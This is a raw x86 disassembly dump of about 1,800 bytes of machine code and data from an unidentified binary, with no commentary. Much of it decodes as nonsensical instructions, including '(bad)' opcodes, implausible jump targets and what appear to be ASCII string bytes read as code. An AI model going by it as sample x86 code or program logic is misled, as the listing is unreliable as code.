  4331e7:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  4331ed:	fadd   QWORD PTR [ebx]
  4331ef:	inc    ebp
  4331f0:	or     al,0x33
  4331f2:	dec    ebp
  4331f3:	add    edi,DWORD PTR [ebx]
  4331f5:	mov    DWORD PTR [edx-0x28],esi
  4331f8:	mov    eax,DWORD PTR [ebp-0x10]
  4331fb:	mov    eax,DWORD PTR [eax+0x10]
  4331fe:	mov    eax,edi
  433200:	lock ret 
  433202:	inc    ecx
  433203:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  433209:	fsubr  st,st(5)
  43320b:	test   DWORD PTR [eax],eax
  43320d:	clc    
  43320e:	push   0x45
  433210:	(bad)  
  433211:	cmp    al,0xec
  433213:	pushf  
  433214:	inc    ebp
  433215:	(bad)  
  433216:	push   eax
  433217:	fsub   DWORD PTR [eax-0x7b]
  43321a:	(bad)  
  43321b:	clc    
  43321c:	mov    eax,0xf8008584
  433221:	mov    eax,DWORD PTR [ebp-0x4]
  433224:	mov    edi,0x4585c3cc
  43322a:	clc    
  43322b:	mov    eax,DWORD PTR [ebp+0x14]
  43322e:	xor    eax,DWORD PTR [ebp-0x64]
  433231:	mov    edi,eax
  433233:	in     al,dx
  433234:	les    esi,FWORD PTR [ebp-0x7b]
  433237:	mov    edi,eax
  433239:	or     al,0x4d
  43323b:	dec    ebp
  43323c:	mov    eax,ebp
  43323e:	in     al,0xf2
  433240:	dec    ebp
  433241:	dec    DWORD PTR [ecx+0x4dc7e045]
  433247:	fmul   DWORD PTR [ecx+0x4df8f085]
  43324d:	inc    ebp
  43324e:	mov    DWORD PTR [ebx],esi
  433250:	fadd   QWORD PTR [ebx]
  433252:	dec    ebp
  433253:	push   eax
  433254:	xor    eax,DWORD PTR [ebp+0x3]
  433257:	push   eax
  433258:	mov    DWORD PTR [eax+ebx*8],ebx
  43325b:	push   esi
  43325d:	mov    eax,DWORD PTR [eax]
  43325f:	lock cmp eax,0xf84e85c0
  433265:	inc    ebp
  433266:	test   BYTE PTR [ebx],dh
  433268:	add    DWORD PTR [ebx],eax
  43326a:	add    BYTE PTR [eax+0x4d],dl
  43326d:	jne    0x4332a2
  43326f:	lea    ecx,[ebx-0x7617fc44]
  433275:	div    ah
  433277:	inc    DWORD PTR [ebp+0x45]
  43327a:	xor    ecx,DWORD PTR [ecx+0x4530d88d]
  433280:	jb     0x43320d
  433282:	add    BYTE PTR [eax*2-0x17ba743f],cl
  433289:	mov    ecx,DWORD PTR [ebp-0x10]
  43328c:	xor    ecx,DWORD PTR [ebp+0x3]
  43328f:	mov    edi,DWORD PTR [ebx]
  433291:	adc    BYTE PTR [ebp+0x41],dh
  433294:	mov    ecx,DWORD PTR [ebx-0x37382704]
  43329a:	ret    
  43329b:	push   ss
  43329c:	push   0x45
  43329e:	lea    ecx,[ebx+0x4de80cb0]
  4332a4:	sti    
  4332a5:	add    edi,edi
  4332a7:	or     BYTE PTR [ebp+0x4d],al
  4332aa:	mov    ebp,DWORD PTR [ebx]
  4332ac:	xor    ebp,ecx
  4332ae:	mov    al,BYTE PTR [edx]
  4332b0:	add    eax,0xc7200
  4332b5:	jne    0x433304
  4332b7:	lea    esi,[ebx]
  4332b9:	mov    al,0xf
  4332bb:	call   0xf2980
  4332c0:	shl    DWORD PTR [ecx],0x84
  4332c3:	pushf  
  4332c4:	add    DWORD PTR [ecx+0x4545d000],ecx
  4332ca:	mov    esi,DWORD PTR [edx]
  4332cc:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  4332d3:	test   DWORD PTR [eax],eax
  4332d5:	clc    
  4332d6:	dec    ebp
  4332d7:	inc    ebp
  4332d8:	xor    edi,DWORD PTR [edi+ecx*1]
  4332db:	pushf  
  4332dc:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  4332e3:	lea    eax,[ecx]
  4332e5:	int3   
  4332e6:	add    BYTE PTR [ebp+0x45],cl
  4332e9:	lea    ecx,[ebx-0x75b2cc38]
  4332ef:	lea    eax,ds:0x4d72c4
  4332f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4332f8:	xor    ecx,edi
  4332fa:	bswap  ebx
  4332fc:	ror    BYTE PTR [ebp-0x35],0xe9
  433300:	rol    DWORD PTR [ecx],0x84
  433303:	add    BYTE PTR [ecx],al
  433305:	xor    eax,DWORD PTR [eax]
  433307:	pushf  
  433308:	inc    ebp
  433309:	jnp    0x8a43670c
  43330f:	mov    eax,DWORD PTR ds:0xcf72e8
  433315:	lock dec ebp
  433317:	retf   
  433318:	xor    ecx,DWORD PTR [ebp+0xf]
  43331b:	mov    eax,eax
  43331d:	fmul   st,st(3)
  43331f:	test   ecx,0x19b8484
  433325:	xor    al,BYTE PTR [eax]
  433327:	mov    DWORD PTR [ebp-0x28],eax
  43332a:	mov    eax,DWORD PTR [ebp+0x33]
  43332d:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  433333:	ret    
  433334:	add    al,cl
  433336:	dec    ebp
  433337:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  43333d:	add    ecx,DWORD PTR ds:0xc7250
  433343:	inc    ebp
  433344:	rcl    DWORD PTR [eax+0x4d],0x2b
  433348:	mov    edi,edi
  43334a:	xor    ecx,DWORD PTR [ebx+0xde48a]
  433350:	jb     0x433319
  433352:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  433359:	mov    esi,DWORD PTR [ebx]
  43335b:	cld    
  43335c:	mov    cl,bh
  43335e:	or     eax,0x372b6
  433363:	cmp    ecx,eax
  433365:	jne    0x4333e2
  43336b:	mov    eax,DWORD PTR [ebp-0x20]
  43336e:	mov    eax,DWORD PTR [eax]
  433370:	xor    eax,edi
  433372:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  433379:	mov    ecx,DWORD PTR [ebp-0x4]
  43337c:	mov    ecx,edi
  43337e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433384:	jb     0x433395
  433386:	add    BYTE PTR [edi-0x3f],dl
  433389:	add    BYTE PTR [ebp-0x75],cl
  43338c:	mov    esi,eax
  43338e:	xor    eax,DWORD PTR [eax]
  433390:	mov    al,bh
  433392:	or     eax,0x4b7284
  433397:	xor    al,cl
  433399:	mov    ecx,DWORD PTR [ebp-0x4]
  43339c:	mov    ecx,edi
  43339e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  4333a4:	jb     0x4333b5
  4333a6:	add    BYTE PTR [edi],dh
  4333a8:	enter  0x8500,0x8b
  4333ac:	add    ah,bl
  4333ae:	add    BYTE PTR [eax],al
  4333b0:	inc    ebp
  4333b1:	(bad)  
  4333b2:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  4333b9:	mov    esi,DWORD PTR [edx-0x4]
  4333bc:	add    bh,cl
  4333be:	dec    ebp
  4333bf:	mov    dh,0x8b
  4333c1:	add    esi,DWORD PTR [ebx]
  4333c3:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  4333c9:	add    BYTE PTR [eax],al
  4333cb:	mov    eax,ecx
  4333cd:	loopne 0x43341c
  4333cf:	add    BYTE PTR [ebx-0x757bcc39],cl
  4333d5:	dec    ebx
  4333d6:	or     eax,0x8b7232
  4333db:	in     al,0xc1
  4333dd:	or     DWORD PTR [ebp-0x31],ecx
  4333e0:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  4333e7:	xor    dh,BYTE PTR [edx-0x75]
  4333ea:	add    al,dh
  4333ec:	enter  0x4f09,0xcf
  4333f0:	inc    ebp
  4333f1:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4333f7:	or     al,BYTE PTR ds:0xe4728b
  4333fd:	or     DWORD PTR [ebp-0x31],ecx
  433400:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433407:	cmp    dh,BYTE PTR [edx+0xf]
  43340a:	add    bl,dl
  43340c:	rol    DWORD PTR [eax],0x4d
  43340f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433415:	(bad)  
  433416:	or     eax,0x4b7284
  43341b:	xor    al,cl
  43341d:	mov    ecx,DWORD PTR [ebp-0x20]
  433420:	mov    ecx,DWORD PTR [ecx]
  433422:	xor    ecx,edi
  433424:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  43342b:	xor    cl,al
  43342d:	mov    ecx,DWORD PTR [edi]
  43342f:	fadd   QWORD PTR [ebp+0x9]
  433432:	call   0xffd02f06
  433437:	dec    ebx
  433438:	dec    ebp
  433439:	xor    bh,BYTE PTR [ebx]
  43343b:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  43343f:	loopne 0x43343d
  433441:	or     edi,eax
  433443:	iret   
  433444:	ret    
  433445:	mov    WORD PTR [ebp+0x4f],es
  433448:	mov    esi,DWORD PTR [edx]
  43344a:	call   0x8452fb89
  43344f:	(bad)  
  433450:	fwait
  433451:	add    BYTE PTR [edx],dh
  433453:	mov    esi,DWORD PTR [ebx]
  433455:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43345b:	test   BYTE PTR [ebx],dh
  43345d:	dec    ebx
  43345e:	add    esi,DWORD PTR [edx]
  433460:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  433466:	dec    edi
  433468:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  43346f:	xor    al,BYTE PTR [ebx]
  433471:	mov    edi,DWORD PTR [ebx]
  433473:	in     al,0x75
  433475:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43347b:	dec    ebx
  43347c:	xor    esi,DWORD PTR [edx]
  43347e:	lea    ecx,[edx]
  433480:	or     BYTE PTR [ebx+0x900f072],cl
  433486:	ja     0x433457
  433488:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43348f:	cmp    ch,al
  433491:	jne    0x433486
  433493:	mov    edi,edi
  433495:	fadd   QWORD PTR [ebp+0x0]
  433498:	mov    eax,edi
  43349a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334a1:	mov    edx,DWORD PTR [ebx]
  4334a3:	in     al,0x45
  4334a5:	or     DWORD PTR [ebx],esi
  4334a7:	iret   
  4334a8:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334af:	xor    dl,BYTE PTR [eax-0x75]
  4334b2:	sbb    al,0xe0
  4334b4:	dec    DWORD PTR [ecx]
  4334b6:	mov    ecx,edi
  4334b8:	in     al,dx
  4334b9:	mov    eax,es
  4334bb:	dec    ebx
  4334bc:	mov    DWORD PTR [edx],esi
  4334be:	fmul   QWORD PTR [edx]
  4334c0:	jne    0x43344d
  4334c2:	(bad)  
  4334c3:	(bad)  
  4334c5:	or     DWORD PTR [ebp-0x31],eax
  4334c8:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334cf:	cmp    bh,bh
  4334d1:	jne    0x433518
  4334d3:	lea    ecx,[ebx-0x38372750]
  4334d9:	inc    ebx
  4334db:	mov    eax,ecx
  4334dd:	mov    eax,0xa00c111
  4334e2:	jne    0x433529
  4334e4:	mov    esi,DWORD PTR [ebx]
  4334e6:	test   al,0x3
  4334e8:	inc    ebp
  4334e9:	mov    DWORD PTR [eax-0xc],edx
  4334ec:	loop   0x433533
  4334ee:	push   DWORD PTR [ebx]
  4334f0:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  4334f6:	add    DWORD PTR [eax],eax
  4334f8:	mov    eax,edi
  4334fa:	lods   al,BYTE PTR ds:[esi]
  4334fb:	dec    ebp
  4334fc:	inc    ebp
  4334fd:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433503:	retf   
  433504:	mov    edx,ecx
  433506:	adc    al,0x84
  433508:	(bad)  
  433509:	std    
  43350a:	ret    
  43350b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433511:	hlt    
  433512:	rol    edi,0x82
  433515:	ret    
  433516:	cld    
  433517:	enter  0x11ff,0x45
  43351b:	inc    ebp
  43351c:	pop    edi
  43351d:	mov    ebx,DWORD PTR [ebx+0x14]
  433520:	ret    0xc7
  433523:	test   BYTE PTR [ebx+0x4532519b],cl
  433529:	jmp    0x4334b6
  43352b:	push   0x8
  43352d:	call   DWORD PTR [esi]
  43352f:	in     al,dx
  433530:	add    BYTE PTR [ebp+0x1],0x50
  433534:	add    bh,ah
  433536:	add    bh,bh
  433538:	icebp  
  433539:	mov    ecx,DWORD PTR [eax]
  43353b:	cld    
  43353c:	pop    es
  43353d:	dec    ebp
  43353e:	shl    DWORD PTR [ebx],0x72
  433541:	add    eax,DWORD PTR [eax]
  433543:	cmp    edx,ecx
  433545:	je     0x433557
  433547:	mov    esi,DWORD PTR [ebp-0x4]
  43354a:	inc    edi
  43354c:	or     al,0xc3
  43354e:	jmp    FWORD PTR [edx-0x18]
  433551:	(bad)  
  433552:	sti    
  433553:	cwde   
  433554:	(bad)  
  433555:	call   0xffa12e60
  43355a:	or     al,0x45
  43355c:	push   ebp
  43355d:	sub    esp,0x18
  433560:	push   ebx
  433561:	inc    ebp
  433562:	mov    edi,edi
  433564:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43356b:	test   al,0x54
  43356d:	inc    ebp
  43356e:	push   ecx
  43356f:	push   eax
  433570:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  433576:	add    ah,bh
  433578:	(bad)  
  433579:	dec    ebp
  43357a:	add    DWORD PTR [ebx],esi
  43357c:	inc    ebp
  43357d:	add    ecx,DWORD PTR [ebx+0x74943b]
  433583:	push   0xffffff8b
  433585:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43358b:	add    eax,DWORD PTR [ecx]
  43358d:	or     BYTE PTR [eax],al
  43358f:	call   0xff852d94
  433594:	mov    eax,DWORD PTR [ebp+0x14]
  433597:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43359d:	inc    ebp
  43359e:	dec    ecx
  43359f:	add    ebp,DWORD PTR [edx+0x14]
  4335a2:	push   0x8b3045
  4335a7:	call   0x33ad831c
  4335ac:	inc    DWORD PTR [ebx]
  4335ae:	mov    DWORD PTR [edi],ecx
  4335b0:	mov    eax,ecx
  4335b2:	or     BYTE PTR [ebp-0x3d],cl
  4335b5:	cmp    eax,edi
  4335b7:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335bc:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335c2:	adc    al,0xc9
  4335c4:	inc    ebp
  4335c5:	adc    BYTE PTR [eax+0x55],dl
  4335c8:	jne    0x4335b6
  4335ca:	call   0xff54355a
  4335cf:	dec    ebp
  4335d0:	inc    ebp
  4335d1:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335d7:	add    BYTE PTR [ebx],bh
  4335d9:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335dd:	push   esp
  4335de:	or     al,0x51
  4335e0:	dec    ebp
  4335e1:	xor    DWORD PTR [ebx],0xf32039b
  4335e7:	cmp    eax,DWORD PTR [ebp+0x74]
  4335ea:	mov    edi,edi
  4335ec:	pop    edi
  4335ed:	adc    BYTE PTR [ebx+0x75],bl
  4335f0:	ret    0x50
  4335f3:	mov    edx,DWORD PTR ss:[edi-0x7d]
  4335f7:	(bad)  
  4335f8:	clc    
  4335f9:	mov    esp,ebp
  4335fb:	pop    ecx
  4335fc:	mov    ecx,0xf80085c2
  433601:	mov    ecx,DWORD PTR [ecx+edx*2]
  433604:	push   esi
  433605:	push   esi
  433606:	(bad)  
  433607:	lock add DWORD PTR [ebp+0x44],eax
  43360b:	mov    edx,DWORD PTR [eax]
  43360d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433611:	or     BYTE PTR [edi+eax*1+0x51],dl
  433615:	ret    
  433616:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43361c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433622:	or     al,0x80
  433624:	jge    0x433627
  433626:	mov    DWORD PTR [eax],eax
  433628:	and    al,0x8
  43362a:	cmp    DWORD PTR [ebp+0x10],eax
  43362d:	mov    edx,DWORD PTR [esi]
  43362f:	xchg   esp,eax
  433630:	dec    esp
  433631:	add    BYTE PTR [eax],dl
  433633:	mov    ecx,edx
  433635:	add    edx,DWORD PTR [esp+edi*1+0x8]
  433639:	dec    ebp
  43363a:	into   
  43363b:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433641:	mov    edx,DWORD PTR [eax+0x14]
  433644:	das    
  433645:	add    al,0x45
  433647:	add    BYTE PTR [ebp+0x0],dh
  43364a:	mov    edi,edi
  43364c:	and    al,0x50
  43364e:	mov    eax,DWORD PTR [eax]
  433650:	and    al,0xd1
  433652:	xor    eax,DWORD PTR [esi]
  433654:	lea    eax,[ebp+0x8]
  433657:	xor    esi,DWORD PTR [edx+0x3]
  43365a:	add    BYTE PTR [ecx+0x4510fc44],cl
  433660:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  433666:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433670:	cmp    al,0xff
  433672:	pushf  
  433673:	mov    edi,edi
  433675:	or     BYTE PTR [esi+ecx*1],cl
  433678:	jne    0x43363d
  43367a:	call   0xc3646
  43367f:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433683:	mov    ebx,DWORD PTR [eax]
  433685:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433689:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433691:	pop    esi
  433692:	and    al,0xc9
  433694:	and    al,0x10
  433696:	call   DWORD PTR [ebp-0x73]
  433699:	in     al,dx
  43369a:	jmp    esp
  43369c:	je     0x433621
  43369e:	call   DWORD PTR [eax]
  4336a0:	and    al,0x31
  4336a2:	call   0xffcd3543
  4336a7:	and    al,0x44
  4336a9:	push   edi
  4336aa:	or     al,0x41
  4336ac:	pop    esi
  4336ad:	mov    ebp,esp
  4336af:	and    al,0xc2
  4336b1:	mov    eax,DWORD PTR [eax]
  4336b3:	and    al,0x85
  4336b5:	mov    edx,0x733080e
  4336ba:	jne    0x4336b6
  4336bc:	test   DWORD PTR [ebx+0x3083275],ebx
  4336c2:	dec    DWORD PTR [ecx-0x74dbdb15]
  4336c8:	sbb    BYTE PTR [esp+edx*1],cl
  4336cb:	jl     0x4336cc
  4336cd:	adc    al,0x24
  4336cf:	dec    ebp
  4336d0:	mov    esi,DWORD PTR [ebp+0xc]
  4336d3:	mov    ecx,DWORD PTR [eax]
  4336d5:	and    al,0x39
  4336d7:	xor    ebx,DWORD PTR [ebx+ecx*4]
  4336da:	or     BYTE PTR [eax+edx*1],ah
  4336dd:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  4336e4:	clc    
  4336e5:	jmp    0x433683
  4336e7:	adc    al,bh
  4336e9:	inc    esp
  4336ea:	je     0x433738
  4336ec:	and    al,0xc2
  4336ee:	je     0x43368b
  4336f0:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  4336f6:	dec    DWORD PTR [ecx+0x235fbf08]
  4336fc:	sbb    al,0x10
  4336fe:	add    BYTE PTR [esi+edi*1+0x10],cl
  433702:	add    BYTE PTR [ebx+0xb],dh
  433705:	adc    BYTE PTR [eax],al
  433707:	mov    WORD PTR ds:0x3d450010,?
  43370d:	adc    BYTE PTR [eax],al
  43370f:	add    DWORD PTR [eax+edx*1],esp
  433712:	add    BYTE PTR [edx+0x6],cl
  433715:	adc    BYTE PTR [eax],al
  433717:	sub    dx,WORD PTR [eax]
  43371a:	add    bh,dl
  43371c:	imul   edx,DWORD PTR [eax],0x10302300
  433722:	add    BYTE PTR [esi-0x4ffef89],dl
  433728:	ss inc ebx
  43372a:	add    bh,bh
  43372c:	ss inc ebx
  43372e:	add    BYTE PTR [ebx],al
  433730:	aaa    
  433731:	inc    ebx
  433732:	add    BYTE PTR [edi],al
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [ebx],cl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [edi],cl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [eax+0x9001011],ah
  433758:	jo     0x43376a
  43375a:	add    BYTE PTR ds:0xd7001027,ch
  433760:	pop    eax
  433761:	adc    BYTE PTR [eax],al
  433763:	push   es
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [esi+0x33001031],ah
  43376c:	ins    BYTE PTR es:[edi],dx
  43376d:	adc    BYTE PTR [eax],al
  43376f:	jb     0x4337b0
  433771:	adc    BYTE PTR [eax],al
  433773:	push   ebx
  433774:	aaa    
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    dh,cl
  433794:	jge    0x4337a6
  433796:	add    BYTE PTR [esi-0x3dffef8e],dl
  43379c:	or     dl,BYTE PTR [eax]
  43379e:	add    dh,bl
  4337a0:	sub    dl,BYTE PTR [eax]
  4337a2:	add    BYTE PTR [edx],bl
  4337a4:	ins    BYTE PTR es:[edi],dx
  4337a5:	adc    BYTE PTR [eax],al
  4337a7:	addr16 jno 0x4337ba
  4337aa:	add    BYTE PTR [ebp+0x3d],ch
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	lds    esp,FWORD PTR [eax+0x10]
  4337b2:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337b8:	aaa    
  4337b9:	inc    ebx
  4337ba:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337c0:	aaa    
  4337c1:	inc    ebx
  4337c2:	add    BYTE PTR [ebx-0x58ffbcc9],ah
  4337c8:	aaa    
  4337c9:	inc    ebx
  4337ca:	add    BYTE PTR [ebx-0x50ffbcc9],ch
  4337d0:	aaa    
  4337d1:	inc    ebx
  4337d2:	add    BYTE PTR [esp+edx*1],bh
  4337d5:	adc    BYTE PTR [eax],al
  4337d7:	clc    
  4337d8:	cmp    dl,BYTE PTR [eax]
  4337da:	add    BYTE PTR [ecx],ah
  4337dc:	pop    ds
  4337dd:	adc    BYTE PTR [eax],al
  4337df:	mov    edi,0x6001073
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [ecx+0x34],bh
  4337e9:	adc    BYTE PTR [eax],al
  4337eb:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  4337ef:	shl    DWORD PTR [edx+0x10],1
  4337f2:	add    bl,dl
  4337f4:	aaa    
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    BYTE PTR [ebp+0x14],al
  433815:	adc    BYTE PTR [eax],al
  433817:	fwait
  433818:	pop    ds
  433819:	adc    BYTE PTR [eax],al
  43381b:	jnp    0x433840
  43381d:	adc    BYTE PTR [eax],al
  43381f:	pop    esi
  433820:	adc    BYTE PTR cs:[eax],al
  433823:	popf   
  433824:	jno    0x433836
  433826:	add    ah,bl
  433828:	inc    ebp
  433829:	adc    BYTE PTR [eax],al
  43382b:	sbb    edx,DWORD PTR [edx+0x10]
  43382e:	add    BYTE PTR [edx+0x13001029],bl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	push   esp
  433854:	xor    al,0x4b
  433856:	aaa    
  433857:	pop    edi
  433858:	inc    edx
  433859:	dec    ebx
  43385a:	xor    DWORD PTR [ecx],edi
  43385c:	push   edi
  43385d:	add    BYTE PTR [ecx+0x39],cl
  433860:	xor    al,0x5f
  433862:	pop    ecx
  433863:	inc    edi
  433864:	push   edx
  433865:	pop    edi
  433866:	dec    edx
  433867:	xor    al,BYTE PTR [edx+0x30]
  43386a:	push   ebx
  43386b:	add    BYTE PTR [ecx+0x4a],cl
  43386e:	cmp    BYTE PTR [edi+0x38],bl
  433871:	xor    al,0x43
  433873:	xor    bl,BYTE PTR [eax+0x36]
  433876:	pop    edi
  433877:	inc    ebx
  433878:	add    BYTE PTR [edx+0x33],cl
  43387b:	dec    ebp
  43387c:	cmp    BYTE PTR [edi+0x53],bl
  43387f:	xor    DWORD PTR [eax],edi
  433881:	pop    edx
  433882:	pop    edi
  433883:	xor    BYTE PTR [edx+0x52],cl
  433886:	inc    ecx
  433887:	add    BYTE PTR [edx+0x42],al
  43388a:	inc    ebp
  43388b:	pop    edi
  43388c:	cmp    DWORD PTR [eax],edi
  43388e:	push   ebp
  43388f:	inc    edx
  433890:	xor    eax,0x5244505f
  433895:	xor    BYTE PTR [eax],al
  433897:	inc    edx
  433898:	inc    esp
  433899:	inc    edx
  43389a:	cmp    DWORD PTR [edi+0x52],ebx
  43389d:	dec    esp
  43389e:	inc    ebp
  43389f:	add    BYTE PTR [ebx+0x37],dl
  4338a2:	push   esp
  4338a3:	xor    BYTE PTR [edi+0x55],bl
  4338a6:	push   ebx
  4338a7:	aaa    
  4338a8:	dec    ebp
  4338a9:	pop    edi
  4338aa:	xor    ecx,DWORD PTR [edx+0x4e]
  4338ad:	dec    ebx
  4338ae:	add    BYTE PTR [edx+0x47],cl
  4338b1:	inc    edi
  4338b2:	xor    eax,0x534e5f32
  4338b7:	push   esp
  4338b8:	pop    edi
  4338b9:	push   esp
  4338ba:	inc    edx
  4338bb:	add    BYTE PTR [ebx+0x4d],al
  4338be:	xor    BYTE PTR [edi+0x47],bl
  4338c1:	cmp    DWORD PTR [ecx+0x5f],ebx
  4338c4:	push   eax
  4338c5:	push   ecx
  4338c6:	push   ecx
  4338c7:	pop    edi
  4338c8:	inc    ebx
  4338c9:	push   edi
  4338ca:	push   esi
  4338cb:	add    BYTE PTR [ecx+0x57],cl
  4338ce:	inc    ebp
  4338cf:	pop    edi
  4338d0:	pop    ecx
  4338d1:	push   edx
  4338d2:	inc    edx
  4338d3:	pop    edi
  4338d4:	inc    edi
  4338d5:	add    BYTE PTR [ebx+0x51],dl
  4338d8:	cmp    DWORD PTR ds:0x4d305f33,esi
  4338de:	inc    edi
  4338df:	xor    edx,DWORD PTR [edx+0x34]
  4338e2:	pop    edi
  4338e3:	pop    edx
  4338e4:	cmp    BYTE PTR [eax],al
  4338e6:	inc    edi
  4338e7:	xor    esi,DWORD PTR ds:0x5451585f
  4338ed:	dec    esp
  4338ee:	add    BYTE PTR [edi+esi*1+0x34],cl
  4338f2:	pop    edi
  4338f3:	cmp    BYTE PTR [edi+0x49],dl
  4338f6:	xor    eax,0x5700505f
  4338fb:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  4338ff:	dec    esi
  433900:	dec    edx
  433901:	cmp    BYTE PTR [eax],al
  433903:	pop    edx
  433904:	dec    ebx
  433905:	xor    eax,0x4f5f3131
  43390a:	xor    dh,BYTE PTR [ecx]
  43390c:	pop    edi
  43390d:	inc    ebp
  43390e:	push   esp
  43390f:	inc    esp
  433910:	inc    ebp
  433911:	add    BYTE PTR [edi+0x55],dl
  433914:	cmp    DWORD PTR [edi+0x5a],ebx
  433917:	push   edx
  433918:	inc    edi
  433919:	xor    DWORD PTR [ebp+0x0],ecx
  43391c:	pop    edx
  43391d:	dec    ecx
  43391e:	dec    ebp
  43391f:	ss pop edi
  433921:	pop    edx
  433922:	push   edx
  433923:	cmp    BYTE PTR [esi+0x30],dl
  433926:	pop    edi
  433927:	push   ecx
  433928:	dec    esi
  433929:	add    BYTE PTR [ebx+0x32],dl
  43392c:	inc    ebx
  43392d:	cmp    BYTE PTR [edi+0x52],bl
  433930:	dec    ecx
  433931:	xor    BYTE PTR [eax],al
  433933:	inc    edi
  433934:	xor    eax,0x314f5f4b
  433939:	xor    DWORD PTR [edi+0x38],ebx
  43393c:	push   ebp
  43393d:	add    BYTE PTR [edi+0x4b],al
  433940:	xor    bl,BYTE PTR [edi+0x43]
  433943:	push   ebp
  433944:	cmp    DWORD PTR [ebp+0x4b],ecx
  433947:	ss pop edi
  433949:	pop    edx
  43394a:	push   edi
  43394b:	inc    esp
  43394c:	xor    BYTE PTR [eax],al
  43394e:	dec    ecx
  43394f:	inc    edi
  433950:	xor    eax,0x3058555f
